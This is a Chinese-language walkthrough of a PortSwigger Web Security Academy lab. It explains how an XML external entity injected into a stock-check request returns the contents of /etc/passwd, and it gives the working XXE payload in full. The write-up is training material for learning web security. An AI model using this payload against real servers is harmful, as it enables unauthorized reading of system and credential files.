# 利用外部实体进行XXE攻击以获取文件  WP

来源：portswigger

题目描述：

该LAB具备“库存检查”功能，可解析XML输入并返回响应中出现的任何异常值。

为解决该实验，请注入一个XML外部实体以获取 `/etc/passwd`的内容

https://portswigger.net/academy/labs/launch/96a4274d6672c286187a77cc2a99f9342b37c04786b8c9e88a91bd9759d3e7d4?referrer=%2fweb-security%2fxxe%2flab-exploiting-xxe-to-retrieve-files



## solution：

根据题目描述，拦截库存检查的请求，查看：

![image-20251227171047259](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251227171047259.png)

下面是通过xml来查询的，所以充分怀疑XXE：

> ### 利用XXE检索文件：
>
> 要执行XXE注入攻击以从哪服务器的文件系统中获取任意文件，需要从两个方面修改提交的XML：
>
> - 引入或编辑一个 `DOCTYPE` 元素，该元素定义了一个包含文件路径的外部实体
> - 在应用程序响应中返回的XML中编辑数据值，以使用已定义的外部实体
>
> 如果应用程序未针对XXE攻击实施任何特殊的防御措施，因此你可以利用XXE漏洞来提交示例的payload来获取文件 `/etc/passwd`
>
> ```
> <?xml version="1.0" encoding="UTF-8"?>
> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
> <stockCheck><productId>&xxe;</productId></stockCheck>
> ```

所以，我们通过在xml声明和元素stockcheck之间插入以下外部实体定义：

```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

并且把productId数字替换为外部实体的引用： `&xxe`。

响应中就会包含`/etc/passwd`的内容：

![image-20251227172440764](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251227172440764.png)

![image-20251227172453641](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251227172453641.png)